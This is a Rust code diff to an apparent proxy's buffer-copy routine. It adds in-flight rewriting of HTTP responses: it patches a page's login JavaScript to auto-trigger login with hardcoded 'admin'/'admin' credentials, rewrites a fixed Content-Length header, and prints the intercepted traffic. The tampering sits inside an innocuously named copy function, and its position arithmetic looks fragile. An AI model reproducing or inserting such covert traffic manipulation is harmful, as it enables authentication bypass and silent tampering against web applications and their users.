@@ -25,15 +25,14 @@ pub(super) struct CopyBuffer {
 }
 
 
-fn replace(from: &[u8], to: &[u8], source: &[u8]) -> Vec<u8> {
-    let search: Option<usize> = kmp_find(from, source);
+fn replace(from: &[u8], to: &[u8], content: &mut Vec<u8>) {
+    let search: Option<usize> = kmp_find(from, &content);
     if let Some(idx) = search {
-        let mut new_vec = Vec::from(&source[0 .. idx]);
+        let mut new_vec = Vec::from(&content[0 .. idx]);
         new_vec.extend(to);
-        new_vec.extend(&source[idx + from.len() .. ]);
-        return new_vec;
+        new_vec.extend(&content[idx + from.len() .. ]);
+        *content = new_vec;
     }
-    return Vec::from(source);
 }
 
 impl CopyBuffer {
@@ -43,7 +42,7 @@ impl CopyBuffer {
             pos: 0,
             cap: 0,
             amt: 0,
-            buf: vec![0; 2048].into_boxed_slice(),
+            buf: vec![0; 65536].into_boxed_slice(),
         }
     }
 
@@ -76,15 +75,36 @@ impl CopyBuffer {
             // If our buffer has some data, let's write it out!
             while self.pos < self.cap {
                 let me = &mut *self;
-                let i = ready!(writer.as_mut().poll_write(cx, &me.buf[me.pos..me.cap]))?;
+
+                let replaces: [[&'static [u8]; 2]; 2] = [
+                    [b"{this._beforeLogin()}", b"{this._beforeLogin();this._onLogin()}"],
+                    [b"s=o.getValue(),r=n.getValue()",b"s='admin',r='admin'"],
+                ];
+
+                let mut buffer = Vec::from(&me.buf[me.pos..me.cap]);
+
+                let old_length = buffer.len();
+
+                for [from, to] in replaces {
+                    replace(from, to, &mut buffer);
+                }
+
+                let new_length = buffer.len();                
+
+                if new_length != old_length {
+                    replace(b"CONTENT-LENGTH: 6236", format!("CONTENT-LENGTH: {}", 6236 + new_length - old_length).as_bytes(), &mut buffer);
+                    println!("come on {} {}", std::str::from_utf8(&me.buf[me.pos..me.cap]).unwrap(), std::str::from_utf8(&buffer).unwrap());
+                }
+
+                let i = ready!(writer.as_mut().poll_write(cx, &buffer))?;
                 if i == 0 {
                     return Poll::Ready(Err(io::Error::new(
                         io::ErrorKind::WriteZero,
                         "write zero byte into writer",
                     )));
                 } else {
-                    self.pos += i;
-                    self.amt += i as u64;
+                    self.pos += i + old_length - new_length;
+                    self.amt += (i + old_length - new_length) as u64;
                 }
             }
 
